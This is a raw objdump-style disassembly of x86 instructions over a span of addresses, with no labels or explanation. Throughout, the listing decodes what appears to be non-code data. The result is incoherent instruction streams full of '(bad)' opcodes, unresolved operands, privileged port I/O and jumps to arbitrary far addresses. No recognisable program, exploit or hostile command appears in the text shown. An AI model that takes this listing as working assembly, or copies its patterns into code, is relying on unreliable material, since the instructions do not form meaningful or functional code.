  4188cb:	add    BYTE PTR [edx+0x282cf52c],cl
  4188d1:	cmp    al,0x70
  4188d3:	and    bl,BYTE PTR [ebp-0x18]
  4188d6:	(bad)  
  4188d7:	fistp  DWORD PTR [ebp+0x1102d111]
  4188dd:	stos   BYTE PTR es:[edi],al
  4188de:	jge    0x41891d
  4188e0:	cli    
  4188e1:	mov    ebx,DWORD PTR [esi-0x68]
  4188e4:	sahf   
  4188e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188e6:	fisub  WORD PTR [bp+0x56c5]
  4188eb:	jge    0x41893a
  4188ed:	sahf   
  4188ee:	loope  0x41891f
  4188f0:	lds    esi,FWORD PTR [edi+0x79]
  4188f3:	mov    ebp,0x29887ef5
  4188f8:	jns    0x4188f9
  4188fa:	push   ecx
  4188fb:	sub    BYTE PTR [eax-0x43],dl
  4188fe:	jno    0x418909
  418900:	mov    dl,0x1b
  418902:	mov    eax,0x58dab6cd
  418907:	in     al,dx
  418908:	out    dx,eax
  418909:	mov    bl,0x60
  41890b:	lods   al,BYTE PTR ds:[esi]
  41890c:	leave  
  41890d:	cs push ebp
  41890f:	and    ebx,edx
  418911:	cmovae ecx,DWORD PTR [ecx+ebx*2-0x64]
  418916:	add    dh,BYTE PTR [esi-0x37]
  418919:	test   al,0x82
  41891b:	in     eax,dx
  41891c:	dec    eax
  41891d:	imul   ecx,DWORD PTR [ecx+0xfba6ee4],0xffffffe7
  418924:	sub    DWORD PTR [edx+0x50bb8e75],eax
  41892a:	xor    ebp,DWORD PTR [ecx-0x3326391]
  418930:	sub    al,0xea
  418932:	pop    ebp
  418933:	sar    BYTE PTR [edi+0x678c8349],0x46
  41893a:	mov    esp,0x1a497d93
  41893f:	inc    ebx
  418940:	mov    BYTE PTR [esi+eax*2-0x3ec1b512],ah
  418947:	inc    ebp
  418948:	xchg   edx,eax
  418949:	lock jo 0x4189bb
  41894c:	sahf   
  41894d:	cs mov bl,dl
  418950:	push   es
  418951:	out    dx,eax
  418952:	pop    ecx
  418953:	jl     0x418993
  418955:	addr16 mov dl,0xb6
  418958:	or     BYTE PTR [edx-0x3],cl
  41895b:	xchg   BYTE PTR [eax-0x31],ah
  41895e:	inc    edx
  41895f:	pop    edi
  418960:	pop    ebx
  418961:	arpl   WORD PTR [esi+0x5566b236],si
  418967:	cmp    DWORD PTR [ecx-0xd],edi
  41896a:	test   DWORD PTR [ebx],esp
  41896c:	mov    dl,0x3e
  41896e:	cmc    
  41896f:	jo     0x418906
  418971:	push   esp
  418972:	je     0x418906
  418974:	xchg   BYTE PTR [ebp-0x45380d5b],dh
  41897a:	pop    ecx
  41897b:	and    al,0xfb
  41897d:	daa    
  41897e:	ins    DWORD PTR es:[edi],dx
  41897f:	out    dx,al
  418980:	pop    ebx
  418981:	mov    dh,0x9a
  418983:	mov    edx,0x3dc63f25
  418988:	cdq    
  418989:	adc    al,0x1
  41898b:	push   eax
  41898c:	gs mov dh,0x7b
  41898f:	adc    eax,0x26653aa9
  418994:	sbb    DWORD PTR [ecx-0x7f],ecx
  418997:	lods   al,BYTE PTR ds:[esi]
  418998:	pop    ds
  418999:	mov    cl,ah
  41899b:	iret   
  41899c:	xor    DWORD PTR [edx+0x62],edx
  41899f:	adc    al,0xfb
  4189a1:	mov    esi,0xb70d8e3c
  4189a6:	test   eax,0xfa8377da
  4189ab:	and    cl,BYTE PTR [edi+0x67a8e360]
  4189b1:	xchg   al,dh
  4189b3:	xlat   BYTE PTR ds:[ebx]
  4189b4:	mov    esp,0xa8df243f
  4189b9:	cli    
  4189ba:	sbb    ebx,DWORD PTR [ebx+0x1b724a1a]
  4189c0:	inc    BYTE PTR [eax]
	...
  418a32:	add    BYTE PTR [eax],al
  418a34:	das    
  418a35:	stos   DWORD PTR es:[edi],eax
  418a36:	cdq    
  418a37:	inc    ecx
  418a38:	popf   
  418a39:	jae    0x418a3a
  418a3b:	out    dx,eax
  418a3c:	inc    esp
  418a3d:	dec    edi
  418a3e:	(bad)  
  418a3f:	clc    
  418a40:	mov    gs:0xbd4fee3,eax
  418a46:	add    DWORD PTR [eax],eax
  418a48:	cmc    
  418a49:	add    BYTE PTR [eax],al
  418a4b:	add    BYTE PTR [eax-0x1d31f447],cl
  418a51:	sti    
  418a52:	mov    ecx,0x7c5761e8
  418a57:	lds    ebx,FWORD PTR [ecx+0x3f]
  418a5a:	imul   ebp,DWORD PTR [esi-0x3ad1bebf],0x9ecb4f25
  418a64:	add    al,0x6a
  418a66:	mov    BYTE PTR [ebp+ecx*8-0x9],0xf5
  418a6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a6c:	inc    ebx
  418a6d:	icebp  
  418a6e:	push   ebx
  418a6f:	sub    BYTE PTR [ecx-0x23],dh
  418a72:	fwait
  418a73:	lahf   
  418a74:	push   cs
  418a75:	xor    al,0x1
  418a77:	push   0xffffffc9
  418a79:	icebp  
  418a7a:	outs   dx,DWORD PTR ds:[esi]
  418a7b:	mov    ecx,0x8c68576c
  418a80:	movhps xmm7,QWORD PTR [edx-0x5b245c52]
  418a87:	test   bh,dl
  418a89:	jbe    0x418a87
  418a8b:	ins    BYTE PTR es:[edi],dx
  418a8c:	fmul   DWORD PTR [ebp+0x3b061fd2]
  418a92:	rcr    DWORD PTR [ebp+0x7f],cl
  418a95:	add    al,0x27
  418a97:	daa    
  418a98:	cmp    edi,ebp
  418a9a:	inc    eax
  418a9b:	rol    DWORD PTR [ecx+0x8ca7c41],0xc
  418aa2:	cmp    eax,0xfada827c
  418aa7:	repnz dec eax
  418aa9:	adc    eax,0x39836e26
  418aae:	shl    DWORD PTR [eax+0x79bec1fa],1
  418ab4:	lahf   
  418ab5:	cli    
  418ab6:	xchg   BYTE PTR [esi+0x8],ch
  418ab9:	mov    edi,DWORD PTR [esi-0x4d]
  418abc:	pop    ss
  418abd:	aam    0xcf
  418abf:	sahf   
  418ac0:	sti    
  418ac1:	(bad)  
  418ac2:	sub    eax,0xf47d4954
  418ac7:	jle    0x418ac9
  418ac9:	adc    DWORD PTR [eax],edi
  418acb:	add    eax,0x51f1d8fd
  418ad0:	mov    al,ds:0x4a8fca4
  418ad5:	retf   0x3fd3
  418ad8:	addr16 xchg ebx,eax
  418ada:	add    al,0x5d
  418adc:	imul   esi,ecx,0xffffffcf
  418adf:	hlt    
  418ae0:	out    dx,al
  418ae1:	outs   dx,DWORD PTR ds:[esi]
  418ae2:	iret   
  418ae3:	fstp   DWORD PTR [esi]
  418ae5:	aas    
  418ae6:	and    al,0x4d
  418ae8:	jmp    0xb3d5:0x927ee2e9
  418aef:	mov    WORD PTR [eax],?
  418af1:	mov    esi,0x5b6a4b1
  418af6:	xchg   DWORD PTR [eax+0x12],eax
  418af9:	adc    al,0xc8
  418afb:	or     ebx,DWORD PTR es:[edx]
  418afe:	push   ebx
  418aff:	fs jl  0x418acf
  418b02:	add    eax,0x2c7cfce7
  418b07:	loopne 0x418ade
  418b09:	in     al,0x4b
  418b0b:	mov    DWORD PTR [esi+0x79006cd7],esp
  418b11:	xchg   edi,eax
  418b12:	scas   al,BYTE PTR es:[edi]
  418b13:	push   es
  418b14:	arpl   dx,sp
  418b16:	mov    ebx,0x8f8e325b
  418b1b:	or     al,0xc8
  418b1d:	add    BYTE PTR [eax],cl
  418b1f:	and    dh,BYTE PTR ds:0x529cd57c
  418b25:	jno    0x418b77
  418b27:	xor    eax,ecx
  418b29:	mov    edx,ecx
  418b2b:	fiadd  DWORD PTR [ecx-0x5]
  418b2e:	sbb    ecx,eax
  418b30:	mov    bl,0xa9
  418b32:	sti    
  418b33:	inc    ecx
  418b34:	add    eax,0xcf8cbfcb
  418b39:	mov    ecx,0x8fb847fa
  418b3e:	nop
  418b3f:	test   DWORD PTR [eax],edx
	...
  418bb1:	add    BYTE PTR [eax],al
  418bb3:	add    BYTE PTR [ecx-0x267b6f40],cl
  418bb9:	aam    0x9d
  418bbb:	int    0x19
  418bbd:	xchg   edx,eax
  418bbe:	clc    
  418bbf:	(bad)  
  418bc0:	cwde   
  418bc1:	mov    ebp,0xcc902c9
  418bc6:	add    DWORD PTR [eax],eax
  418bc8:	cmc    
  418bc9:	add    BYTE PTR [eax],al
  418bcb:	add    BYTE PTR [esi+ebp*8-0x7b187079],al
  418bd2:	mov    eax,ss
  418bd4:	jmp    0xcf4:0x9c97e2aa
  418bdb:	sub    al,0x1
  418bdd:	jo     0x418c58
  418bdf:	or     eax,0x178b54b3
  418be4:	add    ebx,edi
  418be6:	je     0x418c3f
  418be8:	mov    edi,0xece2e060
  418bed:	loope  0x418bf3
  418bef:	pop    esi
  418bf0:	hlt    
  418bf1:	(bad)  [ecx-0xa49d9ce]
  418bf7:	imul   BYTE PTR [ebp+esi*2-0x3661501e]
  418bfe:	sbb    DWORD PTR ds:0xb712f3d7,0xa7fb6f02
  418c08:	ins    BYTE PTR es:[edi],dx
  418c09:	test   al,al
  418c0b:	add    ch,BYTE PTR [ebx]
  418c0d:	add    BYTE PTR [esi+0x4f],ah
  418c10:	int3   
  418c11:	xlat   BYTE PTR ds:[ebx]
  418c12:	adc    BYTE PTR [ecx+0x68f705c3],0x77
  418c19:	das    
  418c1a:	sti    
  418c1b:	dec    ecx
  418c1c:	aam    0xb1
  418c1e:	pop    es
  418c1f:	mov    al,ds:0xf422f163
  418c24:	hlt    
  418c25:	bound  esi,QWORD PTR [edi]
  418c27:	retf   
  418c28:	inc    ecx
  418c29:	aad    0x10
  418c2b:	jecxz  0x418c29
  418c2d:	or     al,0x77
  418c2f:	daa    
  418c30:	inc    dx
  418c32:	push   0x11
  418c34:	scas   eax,DWORD PTR es:[edi]
  418c35:	fist   DWORD PTR [ebx+0x49c43707]
  418c3b:	push   esp
  418c3c:	repnz stc 
  418c3e:	retf   0x7c1b
  418c41:	test   DWORD PTR [ebx-0x48],0x788be6fa
  418c48:	jne    0x418c68
  418c4a:	test   al,0xe8
  418c4c:	add    DWORD PTR [edx],ebx
  418c4e:	retf   
  418c4f:	out    0xca,eax
  418c51:	jo     0x418bdc
  418c53:	out    0xe0,al
  418c55:	cmp    esp,DWORD PTR [ecx]
  418c57:	mov    ch,0x77
  418c59:	inc    esi
  418c5a:	stos   BYTE PTR es:[edi],al
  418c5b:	in     eax,0x8
  418c5d:	imul   ecx,edi,0x9a5c807
  418c63:	ins    BYTE PTR es:[edi],dx
  418c64:	xor    eax,eax
  418c66:	fnsave [edi-0x6b10281]
  418c6c:	xchg   ecx,eax
  418c6d:	mov    al,ds:0xb1e48480
  418c72:	fistp  DWORD PTR [edx]
  418c74:	inc    esp
  418c75:	out    dx,eax
  418c76:	inc    esi
  418c77:	dec    esi
  418c78:	pop    eax
  418c79:	jle    0x418c47
  418c7b:	and    al,0x8b
  418c7d:	out    dx,eax
  418c7e:	(bad)
  418c82:	pop    esi
  418c83:	in     eax,dx
  418c84:	loop   0x418c1b
  418c86:	mov    gs,WORD PTR [ecx+0x515d3a00]
  418c8c:	cmc    
  418c8d:	jmp    0xdf31543
  418c92:	daa    
  418c93:	int3   
  418c94:	ror    edx,1
  418c96:	mov    ebp,0xf810662b
  418c9b:	mov    ecx,0x208636a3
  418ca0:	fst    QWORD PTR [edi-0x3808ef15]
  418ca6:	pusha  
  418ca7:	xlat   BYTE PTR ds:[ebx]
  418ca8:	je     0x418c33
  418caa:	adc    eax,0xd9b9ee84
  418caf:	ja     0x418c3c
  418cb1:	outs   dx,BYTE PTR ds:[esi]
  418cb2:	add    eax,0x93ff27c0
  418cb7:	imul   cl
  418cb9:	retf   
  418cba:	loope  0x418cae
  418cbc:	lea    esi,[edi]
  418cbe:	push   ds
  418cbf:	mov    al,ds:0x5d
	...
  418d34:	pop    ss
  418d35:	arpl   WORD PTR ds:0x5f7f7d53,bx
  418d3b:	addr16 in eax,dx
  418d3d:	inc    eax
  418d3e:	jmp    0x8b2d4961
  418d43:	sub    eax,0x10dbe
  418d48:	cmc    
  418d49:	add    BYTE PTR [eax],al
  418d4b:	add    BYTE PTR [eax-0x5f19b07d],ch
  418d51:	jnp    0x418d0c
  418d53:	mov    BYTE PTR [ecx+0x49036472],bl
  418d59:	imul   esi,DWORD PTR [eax],0x1f
  418d5c:	sbb    al,0x79
  418d5e:	mov    eax,0x4bdbeeee
  418d63:	ret    
  418d64:	pop    esp
  418d65:	add    bl,BYTE PTR [edx-0x9]
  418d68:	inc    ebx
  418d69:	(bad)  [esi-0x5d170c77]
  418d6f:	cs xchg ebp,eax
  418d71:	iret   
  418d72:	mov    ecx,DWORD PTR [ebp+0x55]
  418d75:	das    
  418d76:	inc    esi
  418d77:	gs push ebx
  418d79:	ret    
  418d7a:	ja     0x418d21
  418d7c:	popa   
  418d7d:	ins    DWORD PTR es:[edi],dx
  418d7e:	mov    bl,0xd6
  418d80:	fidivr DWORD PTR [ebp-0x56]
  418d83:	adc    DWORD PTR [esi-0x43faf77c],0x4fae121
  418d8d:	ins    DWORD PTR es:[edi],dx
  418d8e:	inc    esp
  418d8f:	dec    edx
  418d90:	jl     0x418d1b
  418d92:	sbb    eax,0xa89d2f6f
  418d97:	mov    ecx,0x175abadf
  418d9c:	repz jae 0x418d41
  418d9f:	mov    ch,0x2d
  418da1:	jmp    0xc69d:0x15e15b6
  418da8:	xchg   esp,eax
  418da9:	mov    edx,0x384f3f85
  418dae:	repnz cwde 
  418db0:	sub    ah,dl
  418db2:	xlat   BYTE PTR ds:[ebx]
  418db3:	mov    ds:0xb2bd9c0e,al
  418db8:	fdivr  st(0),st
  418dba:	adc    DWORD PTR [ecx],0xb58e6b8f
  418dc0:	pusha  
  418dc1:	cli    
  418dc2:	inc    ebp
  418dc3:	iret   
  418dc4:	in     al,0x3f
  418dc6:	out    0x89,eax
  418dc8:	xchg   ecx,eax
  418dc9:	or     al,0x0
  418dcb:	pop    ss
  418dcc:	mov    ecx,0x3d7f3725
  418dd1:	fidiv  DWORD PTR [esi+eax*4-0x4f]
  418dd5:	repz fsub QWORD PTR [edx-0x1ba03c84]
  418ddc:	das    
  418ddd:	dec    esp
  418dde:	lea    ecx,[eax-0x4f4b56e2]
  418de4:	call   0x52348e82
  418de9:	cmp    BYTE PTR [esi+esi*2+0x7cb682b7],al
  418df0:	xchg   edi,eax
  418df1:	sbb    esp,DWORD PTR [ecx-0x61]
  418df4:	mov    bl,0x20
  418df6:	xchg   ecx,eax
  418df7:	pop    ds
  418df8:	(bad)  
  418df9:	lea    ebp,[esi-0x42b62e3c]
  418dff:	call   0x7293:0xd34ad809
  418e06:	je     0x418dd6
  418e08:	push   es
  418e09:	or     eax,0x4e41177a
  418e0e:	hlt    
  418e0f:	(bad)  
  418e11:	sub    ecx,DWORD PTR [ebx+ecx*8]
  418e14:	cmp    BYTE PTR [edi+0x3bfb83f7],ah
  418e1a:	fisub  DWORD PTR [eax+0x1c]
  418e1d:	xor    eax,DWORD PTR [esi]
  418e1f:	sub    bl,BYTE PTR [edi-0x75faf331]
  418e25:	push   0x68
  418e27:	(bad)  
  418e28:	int3   
  418e29:	jl     0x418dfc
  418e2b:	push   ebp
  418e2c:	mov    bl,0xd7
  418e2e:	out    dx,al
  418e2f:	pop    esp
  418e30:	cmp    ebp,DWORD PTR [edx-0x15]
  418e33:	inc    esp
  418e34:	std    
  418e35:	jno    0x418dbc
  418e37:	push   cs
  418e38:	mov    eax,0xa7fe9284
  418e3d:	out    dx,al
  418e3e:	adc    cl,BYTE PTR [edx-0x6d]
	...
  418eb1:	add    BYTE PTR [eax],al
  418eb3:	add    BYTE PTR [edx-0x1a],ah
  418eb6:	out    0x3b,al
  418eb8:	out    0x3b,al
  418eba:	(bad)  
  418ebb:	push   DWORD PTR [eax-0x20]
  418ebe:	jecxz  0x418eb9
  418ec0:	xchg   DWORD PTR [ebp+0xeb39dcb],edx
  418ec6:	add    DWORD PTR [eax],eax
  418ec8:	cmc    
  418ec9:	add    BYTE PTR [eax],al
  418ecb:	add    bl,bl
  418ecd:	or     BYTE PTR [edx+0x2c],bh
  418ed0:	bound  ecx,QWORD PTR [edx+0x5b4771cf]
  418ed6:	adc    eax,0xd846cebb
  418edb:	into   
  418edc:	rcr    esi,1
  418ede:	data16 (bad) 
  418ee0:	pop    esi
  418ee1:	mov    bh,0x2e
  418ee3:	cmp    ebp,DWORD PTR [ecx-0x5c]
  418ee6:	pop    esp
  418ee7:	sub    eax,0x6d45f181
  418eec:	adc    bl,BYTE PTR [edx+0x2b]
  418eef:	cld    
  418ef0:	push   cs
  418ef1:	neg    BYTE PTR [ecx+esi*1]
  418ef4:	int    0xc1
  418ef6:	aas    
  418ef7:	popa   
  418ef8:	xor    bh,BYTE PTR [ebx-0x1f]
  418efb:	lock xor al,0x5f
  418efe:	inc    ecx
  418eff:	call   0xad26:0xc284c73e
  418f06:	mov    eax,0xbee38c88
  418f0b:	cmp    al,BYTE PTR [ebp+0x700edb3a]
  418f11:	lahf   
  418f12:	mov    al,0x1c
  418f14:	inc    ebx
  418f15:	std    
  418f16:	xor    al,0x86
  418f18:	mov    edi,0x8f4765f3
  418f1d:	and    BYTE PTR [eax],cl
  418f1f:	fcmovne st,st(1)
  418f21:	mov    cs,eax
  418f23:	les    ebx,FWORD PTR [eax+0x709d9ff6]
  418f29:	leave  
  418f2a:	push   edi
  418f2b:	sbb    BYTE PTR [edi],al
  418f2d:	lods   al,BYTE PTR ds:[esi]
  418f2e:	push   0x7bb48335
  418f33:	mov    cl,0xe3
  418f35:	ss adc eax,0x484c27f2
  418f3b:	enter  0x73d4,0xe1
  418f3f:	(bad)  
  418f40:	pop    ds
  418f41:	les    edx,FWORD PTR [eax+0x27]
  418f44:	mov    ecx,?
  418f46:	in     eax,dx
  418f47:	(bad)  [esi+0x3257475c]
  418f4d:	add    al,0x88
  418f4f:	mov    ebx,0xea27861d
  418f54:	outs   dx,BYTE PTR ds:[esi]
  418f55:	pop    edx
  418f56:	pop    esi
  418f57:	imul   ecx,DWORD PTR [esi+0x21b6dc36],0xffffff89
  418f5e:	push   0xf7d15f5c
  418f63:	les    esp,FWORD PTR [edx+eax*8+0x5d]
  418f67:	ror    BYTE PTR [edx-0x5951c1a],cl
  418f6d:	retf   0xbd18
  418f70:	sub    esi,DWORD PTR [eax]
  418f72:	es (bad) 
  418f74:	retf   0x4d4c
  418f77:	pop    esi
  418f78:	cld    
  418f79:	push   ebx
  418f7a:	jae    0x418fa2
  418f7c:	out    0x48,eax
  418f7e:	rcl    al,1
  418f80:	ss mov dl,0x76
  418f83:	mov    BYTE PTR [ebx],0xc8
  418f86:	lods   al,BYTE PTR ds:[esi]
  418f87:	sub    dh,BYTE PTR [edi+0x15e97d48]
  418f8d:	je     0x418f19
  418f8f:	jnp    0x418fc8
  418f91:	cs xchg ebp,eax
  418f93:	or     al,0xe9
  418f95:	xor    ah,dl
  418f97:	inc    ebp
  418f98:	xor    DWORD PTR ds:[eax],edi
  418f9b:	std    
  418f9c:	inc    esi
  418f9d:	loopne 0x418fd0
  418f9f:	lods   al,BYTE PTR ds:[esi]
  418fa0:	xchg   ebp,eax
  418fa1:	pusha  
  418fa2:	call   0xe23e:0xe4caf2ef
  418fa9:	call   0xf054b3a4
  418fae:	scas   al,BYTE PTR es:[edi]
  418faf:	cmp    dl,BYTE PTR ds:0x80c76641
  418fb5:	psubsb mm6,QWORD PTR [edx-0x51]
  418fb9:	pop    esp
  418fba:	sub    bl,bl
  418fbc:	scas   eax,DWORD PTR es:[edi]
  418fbd:	xchg   esp,eax
  418fbe:	outs   dx,BYTE PTR ds:[esi]
  418fbf:	pop    ebp
  418fc0:	retf   
	...
  419031:	add    BYTE PTR [eax],al
  419033:	add    BYTE PTR [ecx-0xba9482],ch
  419039:	push   ebp
  41903a:	scas   eax,DWORD PTR es:[edi]
  41903b:	(bad)  
  41903c:	out    dx,eax
  41903d:	mov    ch,0xb6
  41903f:	shr    BYTE PTR [eax-0x574d9fc5],cl
  419045:	sgdtd  [eax]
  419048:	cmc    
  419049:	add    BYTE PTR [eax],al
  41904b:	add    dh,al
  41904d:	dec    esi
  41904e:	ret    
  41904f:	rcr    DWORD PTR [ecx-0x49],0xb0
  419053:	push   ebp
  419054:	clc    
  419055:	ror    BYTE PTR [esi],1
  419057:	jne    0x419073
  419059:	mov    bl,0x60
  41905b:	and    BYTE PTR [ecx],bl
  41905d:	pop    esi
  41905e:	pop    ebp
  41905f:	mov    ecx,0xe92113ae
  419064:	ja     0x419090
  419066:	ja     0x41900e
  419068:	xchg   ecx,eax
  419069:	push   esp
  41906a:	pop    ecx
  41906b:	mov    ebp,0xf98ab49d
  419070:	sub    DWORD PTR [eax+edx*2+0x31],eax
  419074:	in     al,0xc4
  419076:	cmp    ecx,0x56d237f1
  41907c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41907d:	pusha  
  41907e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41907f:	rcr    DWORD PTR [esp+edi*1],1
  419082:	sub    eax,ebp
  419084:	push   ecx
  419085:	or     eax,DWORD PTR [ebx+0x26]
  419088:	dec    ebx
  419089:	inc    esp
  41908a:	ja     0x4190de
  41908c:	adc    DWORD PTR [ecx-0x1e],edi
  41908f:	inc    esp
  419090:	push   cs
  419091:	push   edi
  419092:	mov    ch,0xf6
  419094:	push   edx
  419095:	add    BYTE PTR [edx+0x24],bh
  419098:	sti    
  419099:	sbb    BYTE PTR [eax+0x13a72796],ch
  41909f:	leave  
  4190a0:	jecxz  0x41904d
  4190a2:	retf   
  4190a3:	sar    BYTE PTR [edi],cl
  4190a5:	cdq    
  4190a6:	rol    DWORD PTR ds:0xab796e56,1
  4190ac:	arpl   WORD PTR [ecx],bp
  4190ae:	sub    DWORD PTR [esi],esp
  4190b0:	jmp    0x846cab5b
  4190b5:	popf   
  4190b6:	aad    0x14
  4190b8:	mov    cl,BYTE PTR [edi+eax*4]
  4190bb:	pop    edi
  4190bc:	dec    edx
  4190bd:	pop    es
  4190be:	out    0xbb,al
  4190c0:	mov    WORD PTR [ebp+0x7288101d],?
  4190c6:	out    dx,eax
  4190c7:	ins    DWORD PTR es:[di],dx
  4190c9:	ins    BYTE PTR es:[edi],dx
  4190ca:	xchg   BYTE PTR [esi-0x2a],dh
  4190cd:	push   ebp
  4190ce:	adc    al,0x9f
  4190d0:	add    al,0xde
  4190d2:	jle    0x419059
  4190d4:	stc    
  4190d5:	sti    
  4190d6:	xor    eax,0x10e2b218
  4190db:	dec    ecx
  4190dc:	pop    ebp
  4190dd:	std    
  4190de:	and    al,0x79
  4190e0:	loope  0x419105
  4190e2:	adc    esi,DWORD PTR [edi]
  4190e4:	jmp    0x88626173
  4190e9:	lahf   
  4190ea:	mov    WORD PTR [esi-0x208409e6],fs
  4190f0:	jge    0x4190ab
  4190f2:	out    dx,al
  4190f3:	dec    ecx
  4190f4:	cmp    eax,DWORD PTR [ebp-0x48]
  4190f7:	lods   eax,DWORD PTR ds:[esi]
  4190f8:	adc    esp,DWORD PTR [edi]
  4190fa:	in     al,0x9f
  4190fc:	std    
  4190fd:	je     0x4190f4
  4190ff:	mov    WORD PTR [eax-0x5c],fs
  419102:	push   ds
  419103:	xchg   ecx,eax
  419104:	push   cs
  419105:	std    
  419106:	ror    ebx,0x5d
  419109:	mov    ebp,0xc05cfa7d
  41910e:	cmp    al,BYTE PTR [ecx+0x66a7292b]
  419114:	xchg   edx,eax
  419115:	add    esi,DWORD PTR ds:0x95a7ebb2
  41911b:	in     eax,0xa7
  41911d:	ja     0x41914b
  41911f:	(bad)  
  419120:	xlat   BYTE PTR ds:[ebx]
  419121:	cmp    BYTE PTR [edi-0x6f],dh
  419124:	mov    ch,0x14
  419126:	pop    esp
  419127:	dec    esp
  419128:	lahf   
  419129:	jle    0x4190f1
  41912b:	dec    eax
  41912c:	xchg   esi,eax
  41912d:	adc    eax,0x3435edfb
  419132:	popf   
  419133:	xchg   esi,eax
  419134:	pop    eax
  419135:	jno    0x419157
  419137:	push   ss
  419138:	xchg   ebx,eax
  419139:	xor    bl,BYTE PTR [eax-0x1e]
  41913c:	inc    ebx
  41913d:	pop    eax
  41913e:	dec    eax
  41913f:	and    bl,BYTE PTR [edi+0x0]
	...
  4191b2:	add    BYTE PTR [eax],al
  4191b4:	aaa    
  4191b5:	xchg   edx,eax
  4191b6:	and    al,0x83
  4191b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191b9:	mov    bh,0xb7
  4191bb:	mov    dh,0xb3
  4191bd:	cmp    al,0x9b
  4191bf:	scas   eax,DWORD PTR es:[edi]
  4191c0:	int    0x9d
  4191c2:	sbb    esi,DWORD PTR [ebp+ebx*4+0x10]
  4191c6:	add    DWORD PTR [eax],eax
  4191c8:	cmc    
  4191c9:	add    BYTE PTR [eax],al
  4191cb:	add    BYTE PTR [esi],dl
  4191cd:	xchg   DWORD PTR [ebx],ebx
  4191cf:	fucomi st,st(5)
  4191d1:	mov    dl,0xa7
  4191d3:	jle    0x4191cf
  4191d5:	pop    esp
  4191d6:	pop    esp
  4191d7:	and    eax,0xd0dbcac0
  4191dc:	stc    
  4191dd:	jns    0x419223
  4191df:	sub    DWORD PTR [edx+0xe],ebp
  4191e2:	lahf   
  4191e3:	sub    DWORD PTR [ebx],0xf5c48a2
  4191e9:	jmp    0x3693aef8
  4191ee:	shl    DWORD PTR [ecx-0x7e77da2],cl
  4191f4:	adc    esp,DWORD PTR [eax-0x1e]
  4191f7:	dec    eax
  4191f8:	stos   BYTE PTR es:[edi],al
  4191f9:	and    al,BYTE PTR [ebx+0x7bd2929c]
  4191ff:	pop    es
  419200:	dec    esp
  419201:	sub    ch,BYTE PTR [edx]
  419203:	dec    ecx
  419204:	aam    0x23
  419206:	push   cs
  419207:	inc    edx
  419208:	ins    DWORD PTR es:[edi],dx
  419209:	inc    al
  41920b:	dec    edx
  41920c:	rcr    DWORD PTR [edx+0x430abbde],0x70
  419213:	xor    bl,BYTE PTR [esi-0x470d32b8]
  419219:	sub    edx,ecx
  41921b:	fwait
  41921c:	dec    esp
  41921d:	sbb    al,0x34
  41921f:	mov    eax,ds:0xc9a336fb
  419224:	pop    ss
  419225:	mov    bh,0x25
  419227:	cmc    
  419228:	pop    edx
  419229:	out    dx,al
  41922a:	dec    ebx
  41922b:	retf   0xa636
  41922e:	das    
  41922f:	cmp    BYTE PTR [edx-0x6f],0x72
  419233:	out    dx,eax
  419234:	add    dh,BYTE PTR [ecx+0x5f]
  419237:	xchg   BYTE PTR [ebx],bh
  419239:	and    eax,0xc59d0a25
  41923e:	cmp    DWORD PTR [edi+eiz*8+0x64095659],ebx
  419245:	jnp    0x4192c1
  419247:	push   ebx
  419248:	and    edx,eax
  41924a:	jmp    0xe9636335
  41924f:	adc    DWORD PTR [edx-0x2f],ebp
  419252:	xchg   BYTE PTR [esi+0x56],al
  419255:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419256:	xchg   ebp,eax
  419257:	xchg   DWORD PTR [ebx-0x6525a606],edx
  41925d:	ror    DWORD PTR ss:[ecx+0x4ea02997],1
  419264:	out    0x78,al
  419266:	(bad)  
  419267:	sahf   
  419268:	loope  0x419261
  41926a:	add    al,0xc5
  41926c:	fnsave [edx+0x1b63581a]
  419272:	and    ch,BYTE PTR [edi+0x33]
  419275:	xchg   ebx,eax
  419276:	clc    
  419277:	sub    al,0x52
  419279:	mov    WORD PTR [edi+eax*1-0x78],?
  41927d:	sub    bl,BYTE PTR [edx]
  41927f:	or     BYTE PTR [edi-0x4571bdd4],ch
  419285:	js     0x4192f0
  419287:	clc    
  419288:	in     al,dx
  419289:	call   0x3cfe:0x327378a3
  419290:	cld    
  419291:	mov    dh,0x84
  419293:	outs   dx,DWORD PTR ds:[esi]
  419294:	and    al,0xa7
  419296:	mov    cl,0xbe
  419298:	mov    ah,0xfc
  41929a:	cmp    BYTE PTR gs:[ebx+0x7d],al
  41929e:	pop    esp
  41929f:	data16 fidivr WORD PTR [edi+0x1f0a9ddd]
  4192a6:	jle    0x4192b5
  4192a8:	inc    eax
  4192a9:	adc    ah,BYTE PTR [ebp+0x9]
  4192ac:	push   ds
  4192ad:	cwde   
  4192ae:	neg    DWORD PTR [eax]
  4192b0:	push   0xcc6ac364
  4192b5:	push   0xb2d0348b
  4192ba:	jb     0x419328
  4192bc:	in     eax,0x9d
  4192be:	outs   dx,BYTE PTR ds:[esi]
  4192bf:	cmp    dl,BYTE PTR [edi+0x0]
	...
  419331:	add    BYTE PTR [eax],al
  419333:	add    ah,bl
  419335:	mov    bl,0x3f
  419337:	push   eax
  419338:	jg     0x419316
  41933a:	(bad)  
  41933b:	mov    edi,0xbcd03e15
  419340:	in     al,dx
  419341:	(bad)  
  419342:	clc    
  419343:	dec    edi
  419344:	xchg   edx,eax
  419345:	adc    DWORD PTR [ecx],eax
  419347:	add    ch,dh
  419349:	add    BYTE PTR [eax],al
  41934b:	add    BYTE PTR [eax+0x6e03afa3],al
  419351:	dec    ebp
  419352:	push   cs
  419353:	fucom  st(6)
  419355:	fist   DWORD PTR [esi+edi*1]
  419358:	dec    eax
  419359:	mov    BYTE PTR [edx+0x6e1470c3],al
  41935f:	ror    ch,0xf2
  419362:	mov    edx,ecx
  419364:	ds cwde 
  419366:	dec    eax
  419367:	or     dl,al
  419369:	and    al,0x41
  41936b:	ret    0x3791
  41936e:	push   ds
  41936f:	lods   eax,DWORD PTR ds:[esi]
  419370:	outs   dx,DWORD PTR ds:[esi]
  419371:	mov    ah,0x9f
  419373:	inc    esi
  419374:	lds    eax,FWORD PTR [ebp-0x31]
  419377:	out    0x53,eax
  419379:	and    DWORD PTR [eax-0x73a11802],ecx
  41937f:	push   ebx
  419380:	(bad)  
  419381:	mov    esp,0x515199fd
